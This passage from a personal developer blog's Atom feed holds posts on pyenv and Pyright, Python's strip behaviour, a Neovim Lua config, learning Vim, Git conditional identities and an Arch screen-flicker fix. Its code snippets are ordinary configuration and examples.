&lt;td&gt;Quit xmonad&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;kbd&gt;mod&lt;/kbd&gt; &lt;kbd&gt;q&lt;/kbd&gt;&lt;/td&gt;
&lt;td&gt;Restart xmonad&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://xmonad.org/documentation.html"&gt;Xmonad docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/title/xmonad"&gt;Xmonad - Arch linux wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="tiling-window-managers"></category><category term="xmonad"></category></entry><entry><title>Make pyenv and pyright play nice together</title><link href="https://railslide.io/make-pyenv-and-pyright-play-nice-together.html" rel="alternate"></link><published>2023-03-12T00:00:00+01:00</published><updated>2023-03-12T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2023-03-12:/make-pyenv-and-pyright-play-nice-together.html</id><summary type="html">&lt;p&gt;If you use &lt;code&gt;pyenv local&lt;/code&gt;, Pyright will not automatically pick up the correct virtualenv. Here's an explanation of why it happens and how to work around it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Some time ago I started looking into setting up the built-in LSPs in Neovim, and being Python my main programming language, I set up &lt;a href="https://github.com/microsoft/pyright/"&gt;Pyright&lt;/a&gt; as my first language server and gave it a spin. While all the basics things worked out of the box, I kept getting a bunch of &lt;code&gt;Import "some_module" could not be resolved&lt;/code&gt;. After having ruled out the classic mistakes (i.e. forgetting to install dependencies, or running Neovim from the wrong folder), and ran some test (&lt;a href="https://github.com/dense-analysis/ale"&gt;Ale&lt;/a&gt; recognized my virtualenv as expected), all that was left was that somehow Pyright did not play along with my virtualenv.&lt;/p&gt;
&lt;h2&gt;Why it happens&lt;/h2&gt;
&lt;p&gt;By default Pyright tries to be smart and to automatically pick up existing virtualenvs. When it comes to Pyenv, Pyright checks whether &lt;code&gt;$PYENV_VERSION&lt;/code&gt; is set and determines which Python interpreter to use from its value. So far so good.&lt;/p&gt;
&lt;p&gt;The problems however start when using &lt;code&gt;pyenv local&lt;/code&gt;. Basically &lt;a href="https://github.com/pyenv/pyenv-virtualenv"&gt;pyenv-virtualenv&lt;/a&gt; has this super nifty function that couples the specified virtualenv with the current folder, so that it gets automatically activated whenever you &lt;code&gt;cd&lt;/code&gt; into the directory (and deactivate once you move away from it). However, whenever the virtualenv gets automagically activated, the &lt;code&gt;$PYENV_VERSION&lt;/code&gt; variable doesn't get set (and apparently that's &lt;a href="https://github.com/pyenv/pyenv/issues/1760"&gt;by design&lt;/a&gt;, and hence unlikely to change anytime soon).&lt;/p&gt;
&lt;h2&gt;How to solve(ish)&lt;/h2&gt;
&lt;p&gt;If you need to fix something on the fly, forcing Pyenv to set the environment variable by using &lt;code&gt;pyenv shell &amp;lt;env_name&amp;gt;&lt;/code&gt; is a quick way to work around the issue. It's worth mentioning, however, that it's only temporary and that you will have type it again every time you start a new shell. So great for debugging, but not ideal as a long term solution.&lt;/p&gt;
&lt;p&gt;A more long term solution is to leverage Pyright configuration options. For doing so, you need to create a &lt;code&gt;pyrightconfig.json&lt;/code&gt; file in the root of your project with the following content&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;venvPath&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;PYENV_ROOT&amp;gt;/versions&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;venv&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;ENV_NAME&amp;gt;&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;where &lt;code&gt;PYENV_ROOT&lt;/code&gt; is the output of &lt;code&gt;echo $PYENV_ROOT&lt;/code&gt; and &lt;code&gt;ENV_NAME&lt;/code&gt; is the name of your virtualenv.&lt;/p&gt;
&lt;p&gt;Keep in mind though that &lt;code&gt;pyrightconfig.json&lt;/code&gt; &lt;u&gt;does not support shell variables&lt;/u&gt;, so stuff like &lt;code&gt;~/.pyenv/versions&lt;/code&gt; won't work.&lt;/p&gt;
&lt;p&gt;While this is a way better method, it still requires a lot of typing. Wouldn't be great if it was possible to automate this somehow? Enter &lt;a href="https://github.com/alefpereira/pyenv-pyright"&gt;pyenv-pyright&lt;/a&gt;, a Pyenv plugin that takes care of handling &lt;code&gt;pyrightconfig.json&lt;/code&gt; on your behalf. So now all you have to do is to type &lt;code&gt;pyenv pyright&lt;/code&gt; once and you're ready to go!&lt;/p&gt;
&lt;p&gt;Happy coding!&lt;/p&gt;
&lt;h2&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/alefpereira/pyenv-pyright"&gt;pyenv-pyright&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/microsoft/pyright/blob/main/docs/configuration.md"&gt;Pyright configuration options&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="python"></category><category term="neovim"></category></entry><entry><title>TIL: strip does not do what I think it does</title><link href="https://railslide.io/til-strip-does-not-do-what-i-think-it-does.html" rel="alternate"></link><published>2023-02-15T00:00:00+01:00</published><updated>2023-02-15T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2023-02-15:/til-strip-does-not-do-what-i-think-it-does.html</id><summary type="html">&lt;p&gt;It turns out I have been using it wrong for all this time!&lt;/p&gt;</summary><content type="html">&lt;p&gt;I always thought &lt;code&gt;strip&lt;/code&gt;, &lt;code&gt;lstrip&lt;/code&gt; and &lt;code&gt;rstrip&lt;/code&gt; would simply match and strip whatever string it was passed to them. However, it turns out that's not how they work.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s2"&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="c1"&gt;# Expected outcome: &amp;#39;lo world&amp;#39;&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;o world&amp;#39;&lt;/span&gt;  &lt;span class="c1"&gt;# Actual outcome&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;What &lt;code&gt;strip&lt;/code&gt;, &lt;code&gt;lstrip&lt;/code&gt; and &lt;code&gt;rstrip&lt;/code&gt; actually do is to remove &lt;strong&gt;any&lt;/strong&gt; of the specified characters until a non-matching character is encountered. So in the example above, the second &lt;code&gt;l&lt;/code&gt; still matches the provided set of chars and hence gets removed. &lt;/p&gt;
&lt;p&gt;I guess most of the time I just got lucky and never stumbled on the actual behavior. But what I should have used in most of the cases is actually &lt;code&gt;removeprefix&lt;/code&gt; and &lt;code&gt;removesuffix&lt;/code&gt;, as the docs suggest.&lt;/p&gt;
&lt;p&gt;Today I learned.&lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/stdtypes.html?highlight=strip#str.rstrip"&gt;Docs for &lt;code&gt;strip&lt;/code&gt;&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/stdtypes.html?highlight=strip#str.lstrip"&gt;Docs for &lt;code&gt;lstrip&lt;/code&gt;&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/stdtypes.html?highlight=strip#str.rstrip"&gt;Docs for &lt;code&gt;rstrip&lt;/code&gt;&lt;/a&gt; &lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="TIL"></category><category term="python"></category></entry><entry><title>Going full in with Neovim</title><link href="https://railslide.io/going-full-in-with-neovim.html" rel="alternate"></link><published>2023-01-21T00:00:00+01:00</published><updated>2023-01-21T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2023-01-21:/going-full-in-with-neovim.html</id><summary type="html">&lt;p&gt;Goodbye &lt;code&gt;.vimrc&lt;/code&gt;, hello &lt;code&gt;lua.init&lt;/code&gt;!&lt;/p&gt;</summary><content type="html">&lt;p&gt;A while ago I decided to fully embrace Neovim and port all my config from &lt;code&gt;.vimrc&lt;/code&gt; over to Lua.&lt;/p&gt;
&lt;h2&gt;The why(s)&lt;/h2&gt;
&lt;p&gt;First thing first, why Neovim? Because you basically get the full Vim experience, but with sane defaults and lsp support. Plus the project is community driven and has faster development cycles (multiple maintainers, less legacy code, etc.). Sure there are some differences, but so far I have yet to find myself in the situation where I fall back to Vim because I cannot do something in Neovim.&lt;/p&gt;
&lt;p&gt;Ok, and what about Lua? When I started my &lt;a href="https://railslide.io/learning-vim-in-2022.html"&gt;Vim adventure&lt;/a&gt; I felt like I didn't know enough about Vim and Neovim to have a strong preference for one over the other, so I just placed all my config in &lt;code&gt;.vimrc&lt;/code&gt; as that was compatible with both. But then time passed and two things happened: first, I realized I have never went back once to Vim after trying Neovim; second, Vim announced that from version 9.0 it will introduce a new scripting language (Vim 9 Script), which will not be completely backward-compatible with the old VimScript. For me that meant that, no matter which editor I chose, I would have to learn a new language. And if I have to put the effort, I'd rather do it for something multipurpose like Lua, than for a language that only applies to my editor.&lt;/p&gt;
&lt;h2&gt;The structure&lt;/h2&gt;
&lt;p&gt;After a bit of back and forth, this is what the directory structure of my config currently looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;nvim&lt;/span&gt;
&lt;span class="n"&gt;├── after&lt;/span&gt;
&lt;span class="n"&gt;│   └── plugin&lt;/span&gt;
&lt;span class="n"&gt;│       ├── ale.lua&lt;/span&gt;
&lt;span class="n"&gt;│       ├── lightline.vim.lua&lt;/span&gt;
&lt;span class="n"&gt;│       ├── onedark.lua&lt;/span&gt;
&lt;span class="n"&gt;│       └── telescope.lua&lt;/span&gt;
&lt;span class="n"&gt;├── init.lua&lt;/span&gt;
&lt;span class="n"&gt;├── lua&lt;/span&gt;
&lt;span class="n"&gt;│   └── railslide&lt;/span&gt;
&lt;span class="n"&gt;│       ├── mappings.lua&lt;/span&gt;
&lt;span class="n"&gt;│       ├── options.lua&lt;/span&gt;
&lt;span class="n"&gt;│       └── plugin-manager.lua&lt;/span&gt;
&lt;span class="n"&gt;└── plugin&lt;/span&gt;
&lt;span class="n"&gt;    └── packer_compiled.lua&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;lua/railside&lt;/code&gt; folder is where I keep my general configuration. The &lt;code&gt;lua&lt;/code&gt; folder is included in Neovim &lt;code&gt;runtimepath&lt;/code&gt; and it's where Neovim looks for Lua plugins by default. Inside that I created a directory with my own username in order to avoid namespace conflicts (the name per se doesn't actually matter, as long as it's something unlikely to be used by something else you're good to go).&lt;/p&gt;
&lt;p&gt;All the files in the &lt;code&gt;railslide&lt;/code&gt; folder are then imported in my &lt;code&gt;init.lua&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;railslide.plugin-manager&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;-- This needs to be at the top&lt;/span&gt;
&lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;railslide.options&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;railslide.mappings&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Plugins&lt;/h2&gt;
&lt;p&gt;A side effect of my config migration is that I switched to a new plugin manager as I decided that I wanted to go for something written in Lua. Packer seemed to be the most popular choice, so I went for that and so far it has been good. There are a lot of good reasons to use Packer, but one of the things I really appreciate is the &lt;a href="https://github.com/wbthomason/packer.nvim#bootstrapping"&gt;bootstrapping snippet&lt;/a&gt; which allows you to automatically install and set up Packer on a new machine.&lt;/p&gt;
&lt;p&gt;My Packer settings and the list of installed plugins are stored in &lt;code&gt;lua/railslide/plugin-manager.lua&lt;/code&gt;, while the files containing the configurations for the actual plugins are in the &lt;code&gt;after/plugin&lt;/code&gt; folder, following a &lt;code&gt;&amp;lt;plugin_name&amp;gt;.lua&lt;/code&gt; naming pattern. The cool thing with the &lt;code&gt;after&lt;/code&gt; folder is that it gets automatically sourced (i.e. no need for me to explicitly require them in my &lt;code&gt;init.lua&lt;/code&gt;) and, as the name suggests, that only happens after all the rest of my configurations have been loaded, which means no risk for plugins not picking up some other setting (e.g. the leader definition). Plus, having a file for each plugin makes it very easy for me to know where the settings for it are and to get rid of them if I were to decide to uninstall the plugin.&lt;/p&gt;
&lt;p&gt;For Lua plugins I also decided to require them through a protected call, i.e.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;status_ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;some_plugin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pcall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;some_plugin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kr"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;status_ok&lt;/span&gt; &lt;span class="kr"&gt;then&lt;/span&gt;
  &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Could not find some_plugin plugin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="kr"&gt;return&lt;/span&gt;
&lt;span class="kr"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;some_plugin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="c1"&gt;-- ...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That way if a plugin isn't correctly loaded, Neovim will display a message below the status line rather than printing out stack traces at start time. This has come in handy for me whenever I forgot to run &lt;code&gt;packerSync&lt;/code&gt; after git pulling an updated copy of my dotfiles, as well as for when I want to temporarily disable a plugin without touching its configuration.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;plugin/packed_compiled.lua&lt;/code&gt; is where Packer stores the compiled code it uses for reducing startup time. I added it to &lt;code&gt;.gitignore&lt;/code&gt; as there was no real benefit in committing it and I didn't want to &lt;a href="https://github.com/wbthomason/packer.nvim/issues/462#issuecomment-876676720"&gt;pollute my git history&lt;/a&gt;. Plus it will be generated anew anyway whenever I set up Neovim on a new machine.&lt;/p&gt;
&lt;h2&gt;Use the source, Luke&lt;/h2&gt;
&lt;p&gt;This is an overview of how my configuration looks and the reasoning that went behind it. So far it has served me well, but of course I'm always happy to find ways to further improve my setup. So if you're curious about the nitty-gritty and/or how my config might evolve in the future, &lt;a href="https://github.com/Railslide/dotfiles/tree/master/neovim/.config/nvim"&gt;my dotfiles repo GitHub&lt;/a&gt; is the place to go.&lt;/p&gt;</content><category term="dev"></category><category term="editor"></category><category term="vim"></category><category term="neovim"></category><category term="tools"></category></entry><entry><title>Learning vim in 2022</title><link href="https://railslide.io/learning-vim-in-2022.html" rel="alternate"></link><published>2023-01-07T00:00:00+01:00</published><updated>2023-01-07T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2023-01-07:/learning-vim-in-2022.html</id><summary type="html">&lt;p&gt;I decided that in 2022 I would learn Vim, here's how it went.&lt;/p&gt;</summary><content type="html">&lt;p&gt;At a certain point I decided that it was time for me to learn how to use Vim. There were mainly two reasons for it. Number one, while playing the Sans Holiday Hack Challenge I have had a taste of how powerful could Vim be, as I discovered that I could open a binary file, pipe it through &lt;code&gt;xxd&lt;/code&gt;, and modify its source code. Second, I recently found myself orphaned of an editor of choice, so I needed to find a new one.&lt;/p&gt;
&lt;h2&gt;Why I needed a new editor&lt;/h2&gt;
&lt;p&gt;For a long time I have used Sublime Text as my go-to editor. I set up a bunch of plugins so that I could have linting and autocompletion, bought a license (at the time the business model of Sublime was an one-off lifelong license) and happily coded with it for a bunch of years. The problem with that setup was that the more languages I started coding in the more plugins I had to add, and those plugins didn't always play along with each other. On top of that Sublime has now switched to a monthly subscription license model, and - while I still use Sublime for occasional note-taking and writing this blog - I don't feel it gives me enough value for committing to a subscription.&lt;/p&gt;
&lt;p&gt;Then came Kotlin and with it came IntelliJ. I loved IntelliJ and for me it's one of the best IDEs out there: fantastic language support, everything can be done through keyboard, fuzzy search for anything you might need (files, actions, etc.), and so on. So why don't I stick to it? Well, mostly because its free version doesn't have multilanguage support. In other words, if you don't use the paid version, you have to use a different editor for each language (i.e. IntelliJ for Kotlin, PyCharm for Python, GoLand for Go, and good luck with JS/Typescript as there's no free version of Webstorm). That is usually not a problem at work, as my employer is happy to cover the cost of the license, but when it comes to the amount of code I do in my free time I found hard to motivate such an expense.&lt;/p&gt;
&lt;p&gt;Last but not least I also gave VSCode a shot, but I found it way too mouse oriented from my liking and its shortcuts didn't feel super intuitive to me.&lt;/p&gt;
&lt;h2&gt;Learning Vim&lt;/h2&gt;
&lt;p&gt;Being Vim a free keyboard-based open source cross-platform editor, it sounded like the perfect answer to all my needs. But of course all that goodness didn't come for free as it involves a steep learning curve. Thankfully there are some amazing resources out there and if you happen to be using Neovim I strongly recommend to go through the tutorial (just launch Neovim and type &lt;code&gt;:Tutor&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;My approach to Vim was to go cold turkey, which in practice meant that I switched to it (or actually to Neovim) as my day-to-day editor. I initially tried to use the Vim Plugin in VSCode, but that didn't really worked for me - maybe it was because I never felt at home with VSCode in the first place, but it mostly felt like a headache without any progress in actually learning Vim. So I went back to Vim and started with a very vanilla configuration with the idea that I would build it up on it whenever I felt the need for extra functionality. Did I get frustrated from lack of functionality from time to time? Absolutely! But shaping my &lt;code&gt;.vimrc&lt;/code&gt; according to my needs and pain points is a great way to reduce the risk of bloating my setup with stuff I don't really need, as well as to make sure that I understand what every single line of my config file does.&lt;/p&gt;
&lt;p&gt;As there's only a certain amount of frustration a person can cope with, I also made some compromises. For example I decided to ignore &lt;code&gt;hjkl&lt;/code&gt; and stick to the arrows - I know this will probably offend Vim purists, but I needed a balance between learning things the Vim way and productivity. I tend to mob and pair programming a lot and I like my colleagues too much for forcing them to watch me trying to navigate around - they still had to put up with me being lost in Vim from time to time, but being unable to move around a file felt like a bit too much to endure. I don't exclude I might try to learn to use &lt;code&gt;jhkl&lt;/code&gt; in the future, but for now it felt like an ok tradeoff to just skip it.&lt;/p&gt;
&lt;p&gt;Copy and pasting is probably the part I struggle the most with at the moment. Vim doesn't use the system clipboard as default, so copy pasting things from and to Vim is anything but straightforward. Also whenever you delete something in Vim it ends in the copy-paste registry, so I often end up overwriting whatever I was meant to copy simply because I removed some stuff before pasting.&lt;/p&gt;
&lt;p&gt;On the bright side there are some motions I really enjoy and see a lot of value in. For example, the ability to delete a whole line by simply typing &lt;code&gt;dd&lt;/code&gt; is a bliss and I often find myself longing for it when using other text-editing programs. I also really like the so called &lt;a href="https://github.com/iggredible/Learn-Vim/blob/master/ch04_vim_grammar.md"&gt;&lt;em&gt;Vim grammar&lt;/em&gt;&lt;/a&gt;, i.e. the ability to combine together motions and operators to create/learn new commands. Or, in more simple terms, how things don't seem to make sense in Vim until you understand the thinking behind them and suddenly everything clicks in place.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;So, was it worthy learning Vim in 2022? To me yes. Sure, it might have been frustrating at times and there were definitely occasions where editing some files took me what it felt like an eternity, but all in all it has been growing on me and nowadays I rarely feel the need to resort to other editors. So if you are willing to put the time, I'd say it's worth a shot.&lt;/p&gt;
&lt;h2&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/neovim/neovim/blob/master/runtime/tutor/en/vim-01-beginner.tutor"&gt;Transcript of the builtin Neovim tutorial&lt;/a&gt;. I highly recommend to do the interactive version of it by typing &lt;code&gt;:Tutor&lt;/code&gt; after launching Neovim, but it's good to have a reference for when you just want to quickly review something.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLm323Lc7iSW_wuxqmKx_xxNtJC_hJbQ7R"&gt;Vim as your editor YouTube Playlist by ThePrimeagean&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/iggredible/Learn-Vim"&gt;Learn Vim (the Smart Way)&lt;/a&gt;. Not for complete beginners but still a great read - just make sure to complete the tutorial first.&lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="editor"></category><category term="vim"></category><category term="tools"></category></entry><entry><title>Managing multiple Git identities</title><link href="https://railslide.io/managing-multiple-git-identities.html" rel="alternate"></link><published>2022-08-30T00:00:00+02:00</published><updated>2022-08-30T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2022-08-30:/managing-multiple-git-identities.html</id><summary type="html">&lt;p&gt;How to manage multiple Git identities on the same machine&lt;/p&gt;</summary><content type="html">&lt;p&gt;I code for work and I code for fun. When I do it for fun I use my personal email address as identity in Git, but when I do it for work I am often required to use my work email. For a long time my solution was to simply to set my working email in the &lt;code&gt;.gitconfig&lt;/code&gt; of my working machine. That worked for most cases (I usually tend to only code for work on my work machine) and as the only pain point seemed to be my dotfiles, I simply accepted the pain of copy-pasting things around as a necessary evil and moved on with my life.&lt;/p&gt;
&lt;p&gt;However, it turns out that there's a better way to handle multiple identities in Git: enter conditional configuration! Basically you can tell Git to include a different &lt;code&gt;.gitconfig&lt;/code&gt; depending on a certain condition (e.g. when the &lt;code&gt;.git&lt;/code&gt; directory matches a certain path). So for my specific case I simply changed my &lt;code&gt;.gitconfig&lt;/code&gt; to like something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;[user]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;lt;first name&amp;gt; &amp;lt;last name&amp;gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;email&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;lt;work email address&amp;gt;&lt;/span&gt;
&lt;span class="k"&gt;[includeIf &amp;quot;gitdir:~/Projects/personal/&amp;quot;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;.gitconfig-personal&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and then in the &lt;code&gt;.gitconfig-personal&lt;/code&gt; I added&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;[user]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;lt;first name&amp;gt; &amp;lt;last name&amp;gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;email&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;lt;personal email address&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and now every time I work on a repo in the &lt;code&gt;personal/&lt;/code&gt; folder the work &lt;code&gt;[user]&lt;/code&gt; block gets automagically overridden by the personal one. No more weird copy pasting around! &lt;/p&gt;
&lt;h3&gt;Gotchas&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;This requires Git 2.13+ to work.&lt;/li&gt;
&lt;li&gt;The last slash of the &lt;code&gt;gitdir&lt;/code&gt; path matters! If you forget it, it won't work.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;../&lt;/code&gt; gets matched literally, so don't use that if you want to refer to the parent folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/docs/git-config#_conditional_includes"&gt;Conditional configuration in Git docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="git"></category></entry><entry><title>How to resolve screen flickering in Arch</title><link href="https://railslide.io/how-to-resolve-screen-flickering-in-arch.html" rel="alternate"></link><published>2022-04-07T00:00:00+02:00</published><updated>2022-04-07T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2022-04-07:/how-to-resolve-screen-flickering-in-arch.html</id><summary type="html">&lt;p&gt;How to solve screen flickering in Arch when using Intel graphics and systemd-boot&lt;/p&gt;</summary><content type="html">&lt;p&gt;After a system upgrade, I got this annoying screen flickering happening at random intervals. Initially I thought the issue was Gnome related, but after a bit of research it turned out to be caused by a &lt;a href="https://wiki.archlinux.org/title/Intel_graphics#Screen_flickering"&gt;power saving feature on my Intel graphic card&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The solution to it is to disable the feature through a kernel parameter. For doing so you need to edit a configuration file specific to the chosen boot loader. In my case it's systemd-boot, so the file was located in &lt;code&gt;/boot/loader/entries/[SOMETHING].conf&lt;/code&gt; (in my case the filename was the timestamp of my system installation, but mileage may vary).&lt;/p&gt;
&lt;p&gt;Open the file with your favourite editor&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nano&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;boot&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;loader&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;entries&lt;/span&gt;&lt;span class="o"&gt;/[&lt;/span&gt;&lt;span class="n"&gt;SOMETHING&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add &lt;code&gt;i915.enable_psr=0&lt;/code&gt; at the end of the &lt;code&gt;options&lt;/code&gt; line.&lt;/p&gt;
&lt;p&gt;Reboot, and enjoy your epilepsy-free screen time again.&lt;/p&gt;
&lt;h2&gt;Further readings&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/title/Intel_graphics"&gt;Arch wiki page about Intel graphics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/title/Kernel_parameters"&gt;Arch wiki page about kernel paremeters&lt;/a&gt;&lt;/li&gt;
